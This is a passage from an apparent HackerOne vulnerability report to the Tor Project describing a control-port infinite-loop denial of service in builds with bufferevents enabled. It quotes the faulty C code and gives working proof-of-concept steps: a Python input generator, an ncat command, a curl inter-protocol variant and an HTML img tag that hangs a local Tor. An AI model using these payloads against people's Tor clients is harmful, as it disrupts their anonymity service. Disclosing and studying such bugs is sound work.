ELSE_IF_NO_BUFFEREVENT {\n3786     return fetch_from_buf_line(conn->inbuf, data, data_len);\n3787   } \n```\n\nThis function will indeed set *data_len to the required size if the present buffer size is too small (line 2255):\n\n```c\n2241 int\n2242 fetch_from_buf_line(buf_t *buf, char *data_out, size_t *data_len)\n2243 {\n2244   size_t sz;\n2245   off_t offset;\n2246 \n2247   if (!buf->head)\n2248     return 0;\n2249     \n2250   offset = buf_find_offset_of_char(buf, '\\n');\n2251   if (offset < 0)\n2252     return 0;\n2253   sz = (size_t) offset;\n2254   if (sz+2 > *data_len) {\n2255     *data_len = sz + 2;\n2256     return -1;\n2257   } \n2258   fetch_from_buf(data_out, sz+1, buf);   \n2259   data_out[sz+1] = '\\0';\n2260   *data_len = sz+1; \n2261   return 1;\n2262 }   \n```\n\nHowever, if libevent bufferevents are enabled (by ./configuring tor with --enable-bufferevents), then the code on lines (3770 - 3784) is executed instead:\n\n```c\n3765 int \n3766 connection_fetch_from_buf_line(connection_t *conn, char *data,\n3767                                size_t *data_len)\n3768 {   \n3769   IF_HAS_BUFFEREVENT(conn, {\n3770     int r;\n3771     size_t eol_len=0;\n3772     struct evbuffer *input = bufferevent_get_input(conn->bufev);\n3773     struct evbuffer_ptr ptr =\n3774       evbuffer_search_eol(input, NULL, &eol_len, EVBUFFER_EOL_LF);\n3775     if (ptr.pos == -1)\n3776       return 0; /* No EOL found. */\n3777     if ((size_t)ptr.pos+eol_len >= *data_len) {\n3778       return -1; /* Too long */\n3779     }     \n3780     *data_len = ptr.pos+eol_len;\n3781     r = evbuffer_remove(input, data, ptr.pos+eol_len);\n3782     tor_assert(r >= 0);\n3783     data[ptr.pos+eol_len] = '\\0';\n3784     return 1;\n3785   }) ELSE_IF_NO_BUFFEREVENT {            \n3786     return fetch_from_buf_line(conn->inbuf, data, data_len);\n3787   }\n3788 }\n```\n\nFollowing the size check on line 3777, *data_len is not altered and thus remains the same as before the invocation.\n\nFor incoming data larger than the initial buffer size (1024 bytes) and contains a linefeed character past 1024 bytes, this sends the control connection input routine into an infinite loop.\n\n# Proof of concept\n$ ./configure --enable-bufferevents && make -j4\n\nNow start tor with this torrc:\n\nControlPort 9999\n\nthen in another terminal:\n\n$ cat genpoc.py \nimport sys\nsys.stdout.write((chr(0x63) * 2000) + chr(0x0A) )\n\n$ python genpoc.py >poc\n$ ncat localhost 9999 <poc\n\ntor now hangs and has to be killed with force (kill -9 <pid>).\n\n#Inter-protocol exploit\n\nSince the only two prerequisites of the attack are:\n\n- Input longer than 1024 bytes\n- Input contains linefeed character after byte 1024\n\nit's easy to think of other ways of making tor hang than manually creating a connection for this purpose.\n\n```\n$ cat genpoc2.py \nprint \"curl http://localhost:9999/{}\".format(\"x\" * 1200)\n$ python genpoc2.py >poc.sh\n$ bash poc.sh\n```\n\nThis also causes tor to hang, because curl is sending this to tor:\n\n````\nGET /xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx HTTP/1.1\nUser-Agent: curl/7.35.0\nHost: localhost:9999\nAccept: */*\n\n```\n\nwhich is data that adheres to the prerequisites.\n\nThus, a person running tor with the control server running locally while also using a regular browser can be DoSed via:\n\n```html\n<img src='http://localhost:9999/xxxxxxxxxxxxxxxxxxx...'>\n```\n\nGuido", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.torproject.org/", 
            "about": "Anonymity Online", 
            "twitter_handle": "torproject", 
            "name": "Tor"
        }, 
        "handle": "torproject", 
        "url": "https://hackerone.com/torproject", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/800/fe36670e5f7b7381549279801c447ae8a3ee12b0_small.jpg?1453239375", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/001/800/f60c4e0509668a31fcd9604fc653ef8a43f2e5c4_medium.jpg?1453239375"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 1800, 
        "default_currency": "usd"
    }, 
    "is_published": false
}